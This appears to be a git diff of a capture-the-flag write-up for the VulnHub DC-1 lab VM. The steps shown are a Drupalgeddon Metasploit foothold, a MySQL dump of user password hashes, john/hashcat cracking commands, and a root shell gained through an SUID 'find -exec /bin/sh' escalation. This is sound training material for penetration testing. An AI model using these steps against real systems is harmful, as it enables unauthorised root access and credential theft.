@@ -1,7 +1,5 @@
 # VulnHub – DC-1 (Linux, Easy) (WIP)
 
-⚠️ Work in Progress – This writeup is being updated step by step.
-
 ## Table of Contents
 - [General Info](#general-info)
 - [Objectives](#objectives)
@@ -72,8 +70,7 @@ run
 # set TARGET 1
 # run
 ```
-Result: a meterpreter session opened successfully.
-Evidence: see Initial Foothold (images/02_foothold_shell.png).
+Result: a Meterpreter session opened successfully (see Figure 2).
 
 (Recap for clarity — keeping the exact commands and outcome in one place.)
 `CHANGELOG.txt` was not accessible (404), so the exact version of Drupal was unknown.  
@@ -139,8 +136,6 @@ $ pwd
 /var/www
 ```
 
-Low-privileged shell as **www-data** obtained via Drupalgeddon (2014).
-
 ![Foothold (meterpreter → shell)](./images/02_foothold_shell.png)
 *Low-priv shell as `www-data` obtained via Drupalgeddon (2014).*
 
@@ -158,6 +153,7 @@ mysql -u dbuser -p'R0ck3t' -D drupaldb -e "SELECT uid,name,mail,pass FROM users;
 
 **Result**
 ![Drupal users dump](./images/03_mysql_users.png)
+*Figure 3 – Extracted Drupal 7 users and password hashes from the database using non-interactive MySQL commands.*
 
 **Findings**
 - Database: `drupaldb`
@@ -170,3 +166,103 @@ mysql -u dbuser -p'R0ck3t' -D drupaldb -e "SELECT uid,name,mail,pass FROM users;
   - `john --format=drupal7 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
   - or `hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt`
 - If `Fred`’s password is recovered, try SSH: `ssh Fred@192.168.25.148`
+
+## Privilege Escalation
+
+After dumping Drupal users, attempts to crack the `$S$` hashes (Drupal 7 PHPass) were inconclusive in the video walkthrough.  
+As a result, the focus shifted to **local privilege escalation** from the existing foothold as `www-data`.
+
+### SUID Enumeration
+
+From the limited shell (`www-data`), we searched for SUID binaries:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Result (excerpt):
+
+/bin/su
+/bin/ping
+/usr/bin/passwd
+/usr/bin/find
+...
+
+The key binary here is **`/usr/bin/find`**, which was set with the SUID bit.  
+This allows abuse via the `-exec` option to spawn a root shell.
+
+### Exploiting SUID `find`
+
+cd /tmp  
+touch testfile  
+find testfile -exec /bin/sh \;  
+whoami  
+id  
+
+Result:
+
+whoami  
+root  
+id  
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)  
+
+- `uid=33(www-data)` → original user.  
+- `euid=0(root)` → effective UID is root → commands now execute with full root privileges.
+
+---
+
+## Post-Exploitation Proof
+
+With root privileges confirmed, we accessed the `/root` directory:
+
+ls -la /root  
+
+Result:
+
+-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt  
+
+Reading the final flag:
+
+/bin/cat /root/thefinalflag.txt  
+
+Output (partially redacted to avoid full spoiler):
+
+Well done!!!!  
+Hopefully you've enjoyed this and learned some new skills.  
+[... output truncated ...]  
+
+![Root proof](images/04_root_proof.png)  
+*Figure 4 – Root access confirmed: `id` shows euid=0(root), listing `/root` reveals the flag, and partial flag output is displayed.*
+
+---
+
+## Cleanup
+
+After proof of root access, sessions were closed:
+
+exit        # exit from root shell  
+exit        # exit from www-data shell  
+
+The target VM can then be safely powered off in the lab environment.
+
+---
+
+## Key Takeaways
+
+- **CMS exploitation:** Older Drupal instances (Drupal 7) can be compromised via Drupalgeddon vulnerabilities. Even without exact version disclosure, fallback exploits may succeed.  
+- **Database credentials:** Always inspect `settings.php` (or CMS config files) for DB creds. These often lead to user hashes or further lateral movement.  
+- **Hash cracking:** Drupal 7 `$S$` hashes are computationally expensive to crack (32k iterations SHA-512). Offline cracking may be slow, especially on CPU-only VMs.  
+- **Privilege Escalation:** When hash cracking fails, local privilege escalation is the alternative. Enumeration of SUID binaries is essential.  
+- **SUID abuse:** `find` with SUID root can trivially spawn a root shell with `-exec`.  
+- **Best practice for reporting:** Include proofs (`id`, access to `/root`, final flag) but redact sensitive or complete flag content when publishing.  
+
+---
+
+## Conclusion
+
+This vulnerable machine (DC-1) demonstrated a full attack chain:
+- Enumeration of exposed services (Drupal CMS identified).
+- Exploitation of Drupalgeddon (2014) to gain initial access as www-data.
+- Database credential extraction and user hash dumping.
+- Privilege escalation through SUID `find`, leading to root access.
+- Final proof by reading the flag in `/root`.
+
+The lab highlights the importance of timely patching CMS platforms, securing configuration files, and auditing SUID binaries on Linux systems.
